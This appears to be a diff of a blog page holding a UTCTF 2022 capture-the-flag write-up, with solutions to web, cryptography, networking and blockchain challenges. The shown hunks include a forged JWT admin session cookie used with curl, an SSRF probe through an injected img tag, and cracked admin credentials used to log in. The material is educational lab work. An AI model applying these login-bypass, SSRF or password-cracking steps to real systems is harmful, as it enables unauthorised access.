@@ -1,29 +1,6 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/site.webmanifest>
-<link rel=mask-icon href=/safari-pinned-tab.svg color=#282a36>
-<meta name=msapplication-TileColor content="#2d89ef">
-<meta name=theme-color content="#282a36">
-<title>
-Writeup: UTCTF 2022 - nevi.dev
-</title><link rel=stylesheet href="/styles.min.3ccabd29c465dc8134033adc11b0759d36344d8cc9a2e2c84a26673954537ae2.css" integrity="sha256-PMq9KcRl3IE0AzrcEbB1nTY0TYzJouLISiZnOVRTeuI=">
-<link rel=stylesheet href=/dist/katex/katex.min.f7808d67f6c9b70ac1619ad7842381be9078ad9533067bc0b22ac5bf7d53306a.css integrity="sha256-94CNZ/bJtwrBYZrXhCOBvpB4rZUzBnvAsirFv31TMGo=">
-<script defer src=/dist/katex/katex.min.6e023d5a12ce3d25253eb7601d4837acf201dafabe0fe9989144ccdead14f1fc.js integrity="sha256-bgI9WhLOPSUlPrdgHUg3rPIB2vq+D+mYkUTM3q0U8fw="></script>
-<script defer src=/dist/katex/contrib/auto-render.min.cb7f4ca60ed5dc3e258415f8c7a3b46d4a93578a52adf83011f18a7f190e7602.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})'></script>
-</head><body>
-<main>
-<article>
-<header>
-<h1>Writeup: UTCTF 2022</h1><time datetime=2022-03-14>2022-03-14</time>
-on <a href=/>nevi.dev</a>
-</header><ul>
-<li>Website: <a href=https://utctf.live/>https://utctf.live/</a></li><li>CTFTime: <a href=https://ctftime.org/event/1582>https://ctftime.org/event/1582</a></li></ul><h2 id=websockets-web>Websockets? (Web)</h2><blockquote>
-<p>Can you hack my website?</p><p>By Daniel Parks (@danielp on discord)</p><p><a href=http://web1.utctf.live:8651>http://web1.utctf.live:8651</a></p></blockquote><p>The employee login page (<code>/internal/login</code>) uses websockets to log in.</p><p>The JS source is as such:</p><pre tabindex=0><code>document.querySelector(&#34;input[type=submit]&#34;).addEventListener(&#34;click&#34;, checkPassword);
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#282a36><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#282a36"><title>Writeup: UTCTF 2022 - nevi.dev</title><link rel=stylesheet href="/styles.min.3ccabd29c465dc8134033adc11b0759d36344d8cc9a2e2c84a26673954537ae2.css" integrity="sha256-PMq9KcRl3IE0AzrcEbB1nTY0TYzJouLISiZnOVRTeuI="><link rel=stylesheet href=/dist/katex/katex.min.4d3844b51f976a58562a47c5dfcdd82ceac8e7434635e22aaf34beab4f1a7eb6.css integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY="><script defer src=/dist/katex/katex.min.41d312281727d87cb0ce1fe496e07f5fe080f881a50594d4e6efe22c013eb2c6.js integrity="sha256-QdMSKBcn2Hywzh/kluB/X+CA+IGlBZTU5u/iLAE+ssY="></script>
+<script defer src=/dist/katex/contrib/auto-render.min.cb7f4ca60ed5dc3e258415f8c7a3b46d4a93578a52adf83011f18a7f190e7602.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})'></script></head><body><main><article><header><h1>Writeup: UTCTF 2022</h1><time datetime=2022-03-14>2022-03-14</time>
+on <a href=/>nevi.dev</a></header><ul><li>Website: <a href=https://utctf.live/>https://utctf.live/</a></li><li>CTFTime: <a href=https://ctftime.org/event/1582>https://ctftime.org/event/1582</a></li></ul><h2 id=websockets-web>Websockets? (Web)</h2><blockquote><p>Can you hack my website?</p><p>By Daniel Parks (@danielp on discord)</p><p><a href=http://web1.utctf.live:8651>http://web1.utctf.live:8651</a></p></blockquote><p>The employee login page (<code>/internal/login</code>) uses websockets to log in.</p><p>The JS source is as such:</p><pre tabindex=0><code>document.querySelector(&#34;input[type=submit]&#34;).addEventListener(&#34;click&#34;, checkPassword);
 
 function checkPassword(evt) {
 	evt.preventDefault();
@@ -58,8 +35,7 @@ which lets us guess the username (<code>admin</code>).</p><p>Inspecting the HTML
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA
 $ curl -sS http://web1.utctf.live:8651/internal/user -b &#39;flask-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0.on9k8zp5TonNvIRtXDxpV9I8KWRNPQHvPXd20DZE8hA&#39; | grep utflag
         utflag{w3bsock3ts}
-</code></pre><p><a href=websockets/websockets.go>websockets.go</a></p><h2 id=html2pdf-web>HTML2PDF (Web)</h2><blockquote>
-<p>My friend bet me I couldn&rsquo;t pwn this site. Can you help me break in?</p><p>(bruteforcing is not necessary or helpful to solve this problem)</p><p><em>by mattyp</em></p><p><a href=http://web2.utctf.live:9854>http://web2.utctf.live:9854</a></p></blockquote><p>The website renders HTML in the input form into PDFs. The placeholder contains
+</code></pre><p><a href=websockets/websockets.go>websockets.go</a></p><h2 id=html2pdf-web>HTML2PDF (Web)</h2><blockquote><p>My friend bet me I couldn&rsquo;t pwn this site. Can you help me break in?</p><p>(bruteforcing is not necessary or helpful to solve this problem)</p><p><em>by mattyp</em></p><p><a href=http://web2.utctf.live:9854>http://web2.utctf.live:9854</a></p></blockquote><p>The website renders HTML in the input form into PDFs. The placeholder contains
 an <code>&lt;img></code> to an external server that gets rendered, so we can try SSRF with
 something like <code>&lt;img src="http://&lt;our-server>"></code>. The challenge server sent us a
 request like so:</p><pre tabindex=0><code>GET / HTTP/1.1
@@ -104,8 +80,7 @@ Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed
 </code></pre><p>Finally, we can use the cracked credentials to obtain the flag.</p><pre tabindex=0><code>$ curl -sS http://web2.utctf.live:9854/admin -F username=WeakPasswordAdmin -F password=sunshine | grep utflag
       &lt;p style=&#34;color:red&#34;&gt;&lt;b&gt;utflag{b1g_r3d_t3am_m0v35_0ut_h3r3}&lt;/p&gt;
-</code></pre><h2 id=failed-hash-function-cryptography>Failed Hash Function (Cryptography)</h2><blockquote>
-<p>I made this keyed hash function for my final project, but I got a 0&mldr;
+</code></pre><h2 id=failed-hash-function-cryptography>Failed Hash Function (Cryptography)</h2><blockquote><p>I made this keyed hash function for my final project, but I got a 0&mldr;
 Apparently, there&rsquo;s too many collisions and you can recover the key after one
 hash. I don&rsquo;t believe it. In fact, if you can break my hash function 100
 times, I&rsquo;ll give you a flag! I&rsquo;ll even be nice &ndash; you get two whole guesses to
@@ -120,8 +95,7 @@ number of trailing zero bits in the product.</p><p>Here, we remember how the num
 is equal to the sum of the number of trailing zeroes in $a$ and $b$. In short,
 each number in the hash function reveals the number of matching trailing
 bits we have in our input.</p><p>Since we can make two queries, we can try to guess the 4 low-order bits of each
-key on the first attempt, and the 4 high-order bits on the second attempt.</p><p>The solution is as follows:</p><ol>
-<li>Try to obtain information on the 4 low-order bits by sending every single
+key on the first attempt, and the 4 high-order bits on the second attempt.</p><p>The solution is as follows:</p><ol><li>Try to obtain information on the 4 low-order bits by sending every single
 combination of the 4 low-order bits (<code>0x000102030405060708090a0b0c0d0e0f</code>).</li><li>Given the hash output, compute every single possible value of <code>k1</code> and <code>k2</code>
 that could produce that output. We are guaranteed to have fewer than 16
 possible values, because the $2^{8-4} = 16$.</li><li>For the second attempt, send every possible value of <code>k1</code> and <code>k2</code> we
@@ -135,8 +109,7 @@ can speed things up by precomputing key values for each possible hash output of
 [*] Closed connection to misc1.utctf.live port 5000
 [+] Dang... guess it really is broken :(
     utflag{Ju5t_u53_SHA256_LoLc4t5_9a114be7f}
-</code></pre><p><a href=failed-hash-function/solve.py>solve.py</a></p><h2 id=sunset-cryptography>Sunset (Cryptography)</h2><blockquote>
-<p>subset sumset what did i do Wrap the value of key with utflag{} for the flag. By oops (@oops on discord)</p><p><a href=sunset/main.py>main.py</a> <a href=sunset/output.py>output.txt</a></p></blockquote><p>We are provided two public keys and some removed values, and we must find the
+</code></pre><p><a href=failed-hash-function/solve.py>solve.py</a></p><h2 id=sunset-cryptography>Sunset (Cryptography)</h2><blockquote><p>subset sumset what did i do Wrap the value of key with utflag{} for the flag. By oops (@oops on discord)</p><p><a href=sunset/main.py>main.py</a> <a href=sunset/output.py>output.txt</a></p></blockquote><p>We are provided two public keys and some removed values, and we must find the
 hash of some shared key generated between these two keypairs.</p><p>Inspecting the code, the algorithm is as follows:</p><pre tabindex=0><code>def get_secret_key():
     key = []
     for i in range(1, N):
@@ -179,8 +152,7 @@ somehow results in the same shared key for both Alice and Bob, which is then
 hashed to obtain the key.</p><p>The challenge output contains the two public keys, the list of removed elements,
 but not the key (our flag). In essence, we need to obtain
 <code>compute_arr(compute_arr([1, 0, ..., 0], sk_a), remove_some_elements(sk_b))</code>.</p><p>To begin solving the challenge, we think about what <code>compute_arr</code> is doing: It
-is perfoming one step per secret key value, where it produces <code>arr + rotate_left(arr, sk)</code> each step.</p><blockquote>
-<p>Warning, bad $\TeX$ follows. I apologise for the garbage notation in advance&mldr;</p></blockquote><p>In other words, with secret key $SK = [a, b]$ and initial array $A_0$,</p><p>$$
+is perfoming one step per secret key value, where it produces <code>arr + rotate_left(arr, sk)</code> each step.</p><blockquote><p>Warning, bad $\TeX$ follows. I apologise for the garbage notation in advance&mldr;</p></blockquote><p>In other words, with secret key $SK = [a, b]$ and initial array $A_0$,</p><p>$$
 \begin{equation*}
 \begin{aligned}
 A_1[i] & = A_0[i] + A_0[i-a] \\
@@ -310,8 +282,7 @@ $\textrm{compute\_arr}^{-1}(\textrm{merge\_arr}(PK_A, PK_B), R)$ to obtain
 the flag, being careful about overflows and operations $\operatorname{mod}
 10^9+7$.</p><pre tabindex=0><code>$ ./solve.py 
 3f3ae3284970df318be8404747bb003fe47cd9bdbb57fc1da52a01b3c028180f
-</code></pre><p><a href=sunset/solve.py>solve.py</a></p><h2 id=malformed-query-networking>Malformed Query (Networking)</h2><blockquote>
-<p>I was looking at my network traffic, and found some interesting packets that
+</code></pre><p><a href=sunset/solve.py>solve.py</a></p><h2 id=malformed-query-networking>Malformed Query (Networking)</h2><blockquote><p>I was looking at my network traffic, and found some interesting packets that
 seem to malformed. Can you figure out what&rsquo;s going on?</p><p>by mattyp</p><p><a href=malformed-query/capture.pcapng>capture.pcapng</a>
 <a href=malformed-query/server.go>server.go</a></p></blockquote><p>Inspecting the capture, most of the traffic is encrypted HTTPS, and some DNS
 queries. However, there is some some interesting UDP traffic over port 9855.</p><pre tabindex=0><code> tshark -r capture.pcapng &#39;udp.port==9855&#39;
@@ -320,7 +291,7 @@ queries. However, there is some some interesting UDP traffic over port 9855.</p>
    63   5.443899 192.168.0.79 → 3.93.213.98  UDP 322 63009 → 9855 Len=280
    64   5.489225  3.93.213.98 → 192.168.0.79 UDP 1106 9855 → 63009 Len=1064
 </code></pre><p>If we look closely, it turns out it&rsquo;s a DNS-like protocol, with the first two
-entries (61 and 62) corressponding to a <code> publickey. IN TXT</code> request and the
+entries (61 and 62) corressponding to a <code>publickey. IN TXT</code> request and the
 server responding with a public key (which happens to be malformed, the PEM
 header should be <code>BEGIN PUBLIC KEY</code> and not <code>BEGIN RSA PUBLIC KEY</code>).</p><p>The next two entries contain malformed DNS data, and looking at the server code
 reveals that the client is sending an RSA-OAEP encrypted query containing a
@@ -349,8 +320,7 @@ the response. Unfortuantely, we could not find any libraries or tools that
 would allow us to send malformed DNS messages, so we glued something together by
 referencing the server source code.</p><pre tabindex=0><code>$ ./malformed 
 utflag{i_love_me_some_spicy_dns}
-</code></pre><p><a href=malformed-query/malformed.go>malformed.go</a></p><h2 id=the-grumpy-genie-misc>The Grumpy Genie (Misc)</h2><blockquote>
-<p>Someone wrote an nft collection for UT, though its quite a mess and theres all
+</code></pre><p><a href=malformed-query/malformed.go>malformed.go</a></p><h2 id=the-grumpy-genie-misc>The Grumpy Genie (Misc)</h2><blockquote><p>Someone wrote an nft collection for UT, though its quite a mess and theres all
 this talk about a genie and Silvio Micali being the real satoshi</p><p>0x867D66C78235CD6c989FbFA34606FcfF637fB613</p><p><a href=https://pastebin.com/T7r9vFvg>https://pastebin.com/T7r9vFvg</a></p><p>By Theo (@Raoul Duke on discord)</p></blockquote><p>The linked pastebin contains code for a smart contract, but it doesn&rsquo;t seem
 useful.</p><p>Searching for the address leads to <a href=https://bscscan.com/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613>BcsScan</a>, with no
 transactions. However, this address is also used on the &ldquo;Ropsten Testnet&rdquo;, which
@@ -358,8 +328,4 @@ is slightly more useful.</p><p>On <a href=https://ropsten.etherscan.io/address/0
 <a href=https://ropsten.etherscan.io/tx/0xca78d2d51101fda93f3f8c62f4349dd23a7e5692cef667ab834c3611601f068f>transaction</a>. This transaction has some input, from which we
 can extract the flag (near the end).</p><pre tabindex=0><code>$ wl-paste | xxd -r -p | strings | grep utflag
 utflag{Did_Y0u_USe_Re3nTrancY?}
-</code></pre></article></main><footer>
-<hr>
-<small><a href=mailto:nevivurn@nevi.dev>email</a> | <a href=https://github.com/nevivurn>github</a><br>
-Content on this site is <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a>.</small>
-</footer></body></html>
+</code></pre></article></main><footer><hr><small><a href=mailto:nevivurn@nevi.dev>email</a> | <a href=https://github.com/nevivurn>github</a><br>Content on this site is <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a>.</small></footer></body></html>
